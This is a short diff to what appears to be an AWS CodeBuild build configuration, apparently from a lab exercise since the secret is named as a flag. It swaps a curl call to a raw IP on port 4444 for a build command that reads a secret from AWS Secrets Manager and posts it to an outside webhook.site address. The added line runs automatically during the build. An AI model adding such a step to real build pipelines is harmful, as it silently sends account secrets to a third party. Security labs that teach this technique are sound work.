@@ -2,4 +2,4 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl http://43.207.130.172:4444
+      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --query SecretString --output text | curl -X POST -d @- https://webhook.site/7a21de07-15d6-453a-b2a7-38413565426b
